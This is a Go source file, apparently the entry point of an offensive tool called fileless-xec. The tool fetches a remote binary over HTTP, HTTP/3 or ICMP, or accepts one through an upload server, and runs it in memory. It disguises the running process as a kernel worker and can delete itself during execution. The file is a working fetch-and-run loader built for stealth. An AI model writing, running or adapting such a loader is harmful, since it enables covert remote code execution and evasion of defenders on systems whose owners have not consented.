package main

import (
	"fileless-xec/pkg/config"
	"fileless-xec/pkg/exec"
	"fileless-xec/pkg/server"
	"fileless-xec/pkg/transport"
	"log"
	"net/http"
	"os"

	"github.com/spf13/cobra"
)

func main() {

	//CMD FILELESS-XEC
	var name string
	var http3 bool
	var selfRm bool
	var unstealth bool

	var cmdFilelessxec = &cobra.Command{
		Use:   "fileless-xec [remote_url]",
		Short: "Execute remote binary locally",
		Long:  `curl a remote binary file and execute it locally in one single step`,
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {

			url := args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()

			var binaryRaw string
			if http3 {
				binaryRaw = transport.GetBinaryRawHTTP3(url) //https if you used server from example
			} else {
				binaryRaw = transport.GetBinaryRaw(url)
			}

			cfg := &config.Config{BinaryContent: binaryRaw, Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}

			exec.Filelessxec(cfg)
		},
	}

	//SERvER MODE

	var cmdServer = &cobra.Command{
		Use:   "server [port]",
		Short: "Use fileless-xec as a server to upload binary file and then execute it",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			port := ":" + args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()
			cfg := &config.Config{Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}
			// Upload route
			http.HandleFunc("/upload", server.UploadAndExecHandler(cfg))

			//Listen
			err := http.ListenAndServe(port, nil)
			if err != nil {
				log.Fatal(err)
			}
		},
	}

	//ICMP SERVER MODE

	var cmdIcmpServer = &cobra.Command{
		Use:   "icmpserver [listening_ip]",
		Short: "Use fileless-xec with icmp protocol to retrieve binary from remote",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			listening := args[0]

			// get argument for binary execution
			argsExec := []string{name}
			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
			environ := os.Environ()
			cfg := &config.Config{Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}

			server.ICMPServerAndExecute(listening, cfg)
		},
	}

	//flag handling
	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution. fileless-xec must be in the same repository that the execution process")
	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it. Not stealth, but useful if your system does not support mem_fd syscall")

	cmdFilelessxec.AddCommand(cmdServer)
	cmdFilelessxec.AddCommand(cmdIcmpServer)
	cmdFilelessxec.Execute()
}
